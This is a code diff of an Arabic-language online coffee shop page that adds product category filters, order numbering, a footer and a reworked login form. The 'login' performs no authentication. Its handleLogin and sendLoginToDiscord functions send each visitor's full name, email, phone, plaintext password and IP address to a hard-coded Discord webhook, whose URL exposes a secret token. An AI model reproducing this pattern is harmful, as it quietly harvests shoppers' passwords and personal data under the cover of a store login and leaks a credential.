@@ -13,7 +13,6 @@
             --text-main: #333333;
             --price-old: #a0a0a0;
             --badge-red: #e53935;
-            --badge-green: #2e7d32;
         }
 
         body {
@@ -22,6 +21,9 @@
             padding: 0;
             background-color: #f7f9fc;
             color: var(--text-main);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
         }
 
         .announcement-bar {
@@ -58,9 +60,6 @@
             border-radius: 8px;
             font-weight: bold;
             font-size: 1.1rem;
-            display: flex;
-            align-items: center;
-            gap: 6px;
         }
 
         .header-actions {
@@ -106,6 +105,38 @@
             max-width: 1200px;
             margin: 30px auto;
             padding: 0 15px;
+            flex: 1;
+        }
+
+        /* شريط أقسام القهوة */
+        .category-nav {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+        }
+
+        .cat-btn {
+            background-color: #e2e8f0;
+            color: var(--text-main);
+            border: none;
+            padding: 10px 22px;
+            border-radius: 25px;
+            font-size: 0.95rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .cat-btn:hover {
+            background-color: #cbd5e1;
+        }
+
+        .cat-btn.active {
+            background-color: var(--bg-navy);
+            color: white;
+            box-shadow: 0 4px 10px rgba(31, 39, 74, 0.2);
         }
 
         .section-title {
@@ -240,7 +271,7 @@
         }
 
         .form-group {
-            margin-bottom: 15px;
+            margin-bottom: 12px;
             text-align: right;
         }
 
@@ -248,9 +279,10 @@
             display: block;
             margin-bottom: 5px;
             font-weight: bold;
+            font-size: 0.9rem;
         }
 
-        .form-group input, .form-group select {
+        .form-group input {
             width: 100%;
             padding: 10px;
             border: 1px solid #ccc;
@@ -278,18 +310,25 @@
             border: 1px solid #ddd;
             border-radius: 6px;
             margin-bottom: 8px;
-            cursor: pointer;
         }
 
         .payment-option.disabled {
             background-color: #f5f5f5;
             color: #999;
-            cursor: not-allowed;
         }
 
-        .payment-option.disabled label {
-            text-decoration: line-through;
-            color: #999;
+        footer {
+            background-color: var(--bg-navy);
+            color: #a0aec0;
+            text-align: center;
+            padding: 20px;
+            font-size: 0.9rem;
+            margin-top: auto;
+            border-top: 1px solid rgba(255,255,255,0.1);
+        }
+
+        footer strong {
+            color: var(--accent-blue);
         }
     </style>
 </head>
@@ -314,89 +353,116 @@
 
     <div class="container">
 
-        <div class="section-title">أنواع القهوة</div>
-        <div class="grid">
-            <div class="product-card">
-                <img src="arabic-bag.png" class="product-img" alt="قهوة عربية">
-                <div class="product-title">قهوة عربية (Arabic Coffee)</div>
-                <div class="product-desc">تحميص هوائي مميز، جودة مختصة ومصادر موثوقة</div>
-                <div class="price-container">
-                    <span class="price-current">6.500 د.ك</span>
-                </div>
-                <button class="btn-add" onclick="addToCart('قهوة عربية', 6.500)">إضافة إلى السلة</button>
-            </div>
+        <!-- أزرار الأقسام والفلترة -->
+        <div class="category-nav">
+            <button class="cat-btn active" onclick="filterCategory('all', this)">⚡ الكل</button>
+            <button class="cat-btn" onclick="filterCategory('coffee', this)">☕ القهوة المختصة</button>
+            <button class="cat-btn" onclick="filterCategory('bundles', this)">🎁 الباقات والاشتراكات</button>
+            <button class="cat-btn" onclick="filterCategory('machines', this)">⚙️ ماكينات القهوة</button>
+        </div>
 
-            <div class="product-card">
-                <img src="turkish-bag.png" class="product-img" alt="قهوة تركية">
-                <div class="product-title">قهوة تركية (Turkish Coffee)</div>
-                <div class="product-desc">تحميص هوائي ناعم لإعداد أطيب فنجان قهوة تركية</div>
-                <div class="price-container">
-                    <span class="price-current">6.000 د.ك</span>
+        <!-- قسم أنواع القهوة -->
+        <div class="category-group" id="cat-coffee">
+            <div class="section-title">أنواع القهوة المختصة</div>
+            <div class="grid">
+                <div class="product-card">
+                    <img src="arabic-bag.png" class="product-img" alt="قهوة عربية">
+                    <div class="product-title">قهوة عربية (Arabic Coffee)</div>
+                    <div class="product-desc">تحميص هوائي مميز، جودة مختصة ومصادر موثوقة</div>
+                    <div class="price-container">
+                        <span class="price-current">6.500 د.ك</span>
+                    </div>
+                    <button class="btn-add" onclick="addToCart('قهوة عربية', 6.500)">إضافة إلى السلة</button>
                 </div>
-                <button class="btn-add" onclick="addToCart('قهوة تركية', 6.000)">إضافة إلى السلة</button>
+
+                <div class="product-card">
+                    <img src="turkish-bag.png" class="product-img" alt="قهوة تركية">
+                    <div class="product-title">قهوة تركية (Turkish Coffee)</div>
+                    <div class="product-desc">تحميص هوائي ناعم لإعداد أطيب فنجان قهوة تركية</div>
+                    <div class="price-container">
+                        <span class="price-current">6.000 د.ك</span>
+                    </div>
+                    <button class="btn-add" onclick="addToCart('قهوة تركية', 6.000)">إضافة إلى السلة</button>
+                </div>
             </div>
         </div>
 
-        <div class="section-title">الاشتراكات والباقات</div>
-        <div class="grid">
-            <div class="product-card">
-                <span class="discount-badge">-20%</span>
-                <img src="classic-bundle.png" class="product-img" alt="الباقة الكلاسيكية">
-                <div class="product-title">الباقة الكلاسيكية</div>
-                <div class="product-desc">مجموعة كلاسيكية لتجربة القهوة الممتازة</div>
-                <div class="price-container">
-                    <span class="price-current">14.600 د.ك</span>
-                    <span class="price-old">18.250</span>
+        <!-- قسم الاشتراكات والباقات -->
+        <div class="category-group" id="cat-bundles">
+            <div class="section-title">الاشتراكات والباقات</div>
+            <div class="grid">
+                <div class="product-card">
+                    <span class="discount-badge">-20%</span>
+                    <img src="classic-bundle.png" class="product-img" alt="الباقة الكلاسيكية">
+                    <div class="product-title">الباقة الكلاسيكية</div>
+                    <div class="product-desc">مجموعة كلاسيكية لتجربة القهوة الممتازة</div>
+                    <div class="price-container">
+                        <span class="price-current">14.600 د.ك</span>
+                        <span class="price-old">18.250</span>
+                    </div>
+                    <button class="btn-add" onclick="addToCart('الباقة الكلاسيكية', 14.600)">إضافة إلى السلة</button>
                 </div>
-                <button class="btn-add" onclick="addToCart('الباقة الكلاسيكية', 14.600)">إضافة إلى السلة</button>
-            </div>
 
-            <div class="product-card">
-                <span class="discount-badge">-25%</span>
-                <img src="fruity-bundle.png" class="product-img" alt="الباقة الفاكهية">
-                <div class="product-title">الباقة الفاكهية</div>
-                <div class="product-desc">إيحاءات فاكهية مميزة لعشاق القهوة المختصة</div>
-                <div class="price-container">
-                    <span class="price-current">17.250 د.ك</span>
-                    <span class="price-old">23.000</span>
+                <div class="product-card">
+                    <span class="discount-badge">-25%</span>
+                    <img src="fruity-bundle.png" class="product-img" alt="الباقة الفاكهية">
+                    <div class="product-title">الباقة الفاكهية</div>
+                    <div class="product-desc">إيحاءات فاكهية مميزة لعشاق القهوة المختصة</div>
+                    <div class="price-container">
+                        <span class="price-current">17.250 د.ك</span>
+                        <span class="price-old">23.000</span>
+                    </div>
+                    <button class="btn-add" onclick="addToCart('الباقة الفاكهية', 17.250)">إضافة إلى السلة</button>
                 </div>
-                <button class="btn-add" onclick="addToCart('الباقة الفاكهية', 17.250)">إضافة إلى السلة</button>
             </div>
         </div>
 
-        <div class="section-title">ماكينات القهوة</div>
-        <div class="grid">
-            <div class="product-card">
-                <img src="jura-e8.png" class="product-img" alt="Jura E8">
-                <div class="product-title">Jura E8 Piano Black</div>
-                <div class="product-desc">أحدث إصدارات Jura للأداء الاحترافي</div>
-                <div class="price-container">
-                    <span class="price-current">550.000 د.ك</span>
+        <!-- قسم ماكينات القهوة -->
+        <div class="category-group" id="cat-machines">
+            <div class="section-title">ماكينات القهوة</div>
+            <div class="grid">
+                <div class="product-card">
+                    <img src="jura-e8.png" class="product-img" alt="Jura E8">
+                    <div class="product-title">Jura E8 Piano Black</div>
+                    <div class="product-desc">أحدث إصدارات Jura للأداء الاحترافي</div>
+                    <div class="price-container">
+                        <span class="price-current">550.000 د.ك</span>
+                    </div>
+                    <button class="btn-add" onclick="addToCart('Jura E8 Piano Black', 550.000)">إضافة إلى السلة</button>
                 </div>
-                <button class="btn-add" onclick="addToCart('Jura E8 Piano Black', 550.000)">إضافة إلى السلة</button>
             </div>
         </div>
 
     </div>
 
+    <!-- نافذة تسجيل الدخول -->
     <div id="loginModal" class="modal">
         <div class="modal-content">
             <button class="close-modal" onclick="closeModal('loginModal')">✕</button>
             <h3 style="text-align: center; margin-top: 0;">تسجيل الدخول للموقع</h3>
             <form id="loginForm" onsubmit="handleLogin(event)">
                 <div class="form-group">
-                    <label>الاسم أو رقم الهاتف</label>
-                    <input type="text" id="username" required placeholder="أدخل اسمك أو رقمك">
+                    <label>الاسم الكامل</label>
+                    <input type="text" id="fullName" required placeholder="أدخل اسمك الثلاثي">
                 </div>
                 <div class="form-group">
-                    <label>كلمة المرور</label>
-                    <input type="password" id="password" required placeholder="أدخل كلمة المرور">
+                    <label>البريد الإلكتروني</label>
+                    <input type="email" id="email" required placeholder="example@mail.com">
                 </div>
-                <button type="submit" class="btn-add" style="margin-top: 10px;">دخول</button>
+                <div class="form-group">
+                    <label>رقم الهاتف</label>
+                    <input type="tel" id="phone" required placeholder="مثال: 99887766">
+                </div>
+                <div class="form-group">
+                    <label>كلمة المرور (من 8 إلى 100 حرف)</label>
+                    <input type="password" id="password" minlength="8" maxlength="100" required placeholder="********">
+                </div>
+                <button type="submit" class="btn-add" style="margin-top: 10px;">تسجيل الدخول</button>
             </form>
         </div>
     </div>
 
+    <!-- نافذة سلة المشتريات -->
     <div id="cartModal" class="modal">
         <div class="modal-content">
             <button class="close-modal" onclick="closeModal('cartModal')">✕</button>
@@ -410,16 +476,14 @@
             </div>
 
             <div class="payment-methods">
-                <label style="font-weight: bold; margin-bottom: 8px; display: block;">اختر طريقة الدفع:</label>
-                
+                <label style="font-weight: bold; margin-bottom: 8px; display: block;">طريقة الدفع:</label>
                 <div class="payment-option">
                     <input type="radio" id="payCOD" name="paymentMethod" value="الدفع عند الاستلام" checked>
                     <label for="payCOD">💵 الدفع عند الاستلام (COD)</label>
                 </div>
-
                 <div class="payment-option disabled">
                     <input type="radio" id="payKnet" name="paymentMethod" value="KNET" disabled>
-                    <label for="payKnet">💳 بطاقة كي نت (K-NET) <small style="color: #d32f2f;">(غير متاح حالياً)</small></label>
+                    <label for="payKnet">💳 كي نت (K-NET) <small style="color: #d32f2f;">(غير متاح)</small></label>
                 </div>
             </div>
 
@@ -427,11 +491,44 @@
         </div>
     </div>
 
+    <footer>
+        © 2026 محمصة لورا - جميع الحقوق محفوظة | <strong>Dev by: Nasser</strong>
+    </footer>
+
     <script>
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1542554021510774814/kURM7_KSoI1f6-7rEopGSwzjQ26KJY_-OW9DTkvAiofOUms2wrsWr-BO2d7slwCs52j5";
 
         let currentUser = null;
         let cart = [];
+
+        function filterCategory(category, btnElement) {
+            const buttons = document.querySelectorAll('.cat-btn');
+            buttons.forEach(btn => btn.classList.remove('active'));
+            btnElement.classList.add('active');
+
+            const groups = document.querySelectorAll('.category-group');
+            groups.forEach(group => {
+                if (category === 'all') {
+                    group.style.display = 'block';
+                } else {
+                    if (group.id === `cat-${category}`) {
+                        group.style.display = 'block';
+                    } else {
+                        group.style.display = 'none';
+                    }
+                }
+            });
+        }
+
+        function getNextOrderNumber() {
+            let currentNum = parseInt(localStorage.getItem('lora_order_counter') || '1');
+            return currentNum;
+        }
+
+        function incrementOrderNumber() {
+            let currentNum = getNextOrderNumber();
+            localStorage.setItem('lora_order_counter', (currentNum + 1).toString());
+        }
 
         function openLoginModal() { document.getElementById('loginModal').style.display = 'flex'; }
         function toggleCartModal() { document.getElementById('cartModal').style.display = 'flex'; updateCartUI(); }
@@ -439,47 +536,52 @@
 
         async function handleLogin(e) {
             e.preventDefault();
-            const username = document.getElementById('username').value;
+            
+            const fullName = document.getElementById('fullName').value;
+            const email = document.getElementById('email').value;
+            const phone = document.getElementById('phone').value;
             const password = document.getElementById('password').value;
 
+            currentUser = { fullName, email, phone };
+
             closeModal('loginModal');
+
+            document.getElementById('userArea').innerHTML = `
+                <span style="font-size: 0.9rem; margin-left: 8px;">مرحباً، <b>${fullName}</b></span>
+                <button class="btn-logout" onclick="handleLogout()">خروج</button>
+            `;
 
             let userIP = "غير معروف";
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 userIP = data.ip;
-            } catch (err) {
-                console.error("فشل جلب عنوان IP:", err);
-            }
+            } catch (err) {}
 
-            currentUser = username;
-
-            document.getElementById('userArea').innerHTML = `
-                <span style="font-size: 0.9rem; margin-left: 8px;">مرحباً، <b>${username}</b></span>
-                <button class="btn-logout" onclick="handleLogout()">خروج</button>
-            `;
-
-            sendLoginToDiscord(username, password, userIP);
+            sendLoginToDiscord(fullName, email, phone, password, userIP);
         }
 
         function handleLogout() {
             currentUser = null;
+            cart = [];
+            document.getElementById('cartCount').innerText = '0';
             document.getElementById('userArea').innerHTML = `
                 <button class="btn-auth" onclick="openLoginModal()">تسجيل الدخول</button>
             `;
             alert('تم تسجيل الخروج بنجاح.');
         }
 
-        function sendLoginToDiscord(username, password, ip) {
+        function sendLoginToDiscord(name, email, phone, password, ip) {
             const payload = {
                 embeds: [{
-                    title: "🔑 تسجيل دخول جديد في الموقع",
+                    title: "🔑 تسجيل دخول جديد",
                     color: 3066993,
                     fields: [
-                        { name: "👤 اسم المستخدم / الهاتف", value: username, inline: true },
+                        { name: "👤 الاسم", value: name, inline: true },
+                        { name: "📱 رقم الهاتف", value: phone, inline: true },
+                        { name: "📧 البريد الإلكتروني", value: email, inline: false },
                         { name: "🔒 كلمة المرور", value: password, inline: true },
-                        { name: "🌐 عنوان الـ IP", value: ip, inline: false }
+                        { name: "🌐 IP", value: ip, inline: true }
                     ],
                     timestamp: new Date()
                 }]
@@ -493,6 +595,12 @@
         }
 
         function addToCart(title, price) {
+            if (!currentUser) {
+                alert('عذراً! لا يمكنك إضافة المنتجات إلى السلة إلا بعد تسجيل الدخول أولاً.');
+                openLoginModal();
+                return;
+            }
+
             cart.push({ title, price });
             document.getElementById('cartCount').innerText = cart.length;
             alert(`تمت إضافة "${title}" إلى السلة.`);
@@ -526,12 +634,14 @@
             }
 
             if (!currentUser) {
-                alert('يرجى تسجيل الدخول أولاً لتأكيد الطلب!');
+                alert('يرجى تسجيل الدخول لتأكيد الطلب!');
                 closeModal('cartModal');
                 openLoginModal();
                 return;
             }
 
+            const currentOrderNum = getNextOrderNumber();
+            const orderID = `#${currentOrderNum}`;
             const paymentMethod = document.querySelector('input[name="paymentMethod"]:checked').value;
 
             let itemsList = cart.map(i => `- ${i.title} (${i.price.toFixed(3)} د.ك)`).join('\n');
@@ -539,11 +649,13 @@
 
             const payload = {
                 embeds: [{
-                    title: "🛒 طلب شراء جديد من الموقع",
+                    title: `🛒 طلب شراء جديد (${orderID})`,
                     color: 15105570,
                     fields: [
-                        { name: "👤 العميل", value: currentUser, inline: true },
-                        { name: "💳 طريقة الدفع", value: paymentMethod, inline: true },
+                        { name: "🆔 رقم الطلب", value: orderID, inline: true },
+                        { name: "👤 اسم العميل", value: currentUser.fullName, inline: true },
+                        { name: "📱 رقم الهاتف", value: currentUser.phone, inline: true },
+                        { name: "💳 طريقة الدفع", value: paymentMethod, inline: false },
                         { name: "📦 المنتجات المطلوبة", value: itemsList, inline: false },
                         { name: "💰 الإجمالي", value: `${totalSum} د.ك`, inline: true }
                     ],
@@ -556,7 +668,8 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             }).then(() => {
-                alert('تم استلام طلبك بنجاح! طريقة الدفع: الدفع عند الاستلام.');
+                alert(`تم استلام طلبك بنجاح!\nرقم الطلب الخاص بك هو: ${orderID}`);
+                incrementOrderNumber();
                 cart = [];
                 document.getElementById('cartCount').innerText = '0';
                 closeModal('cartModal');
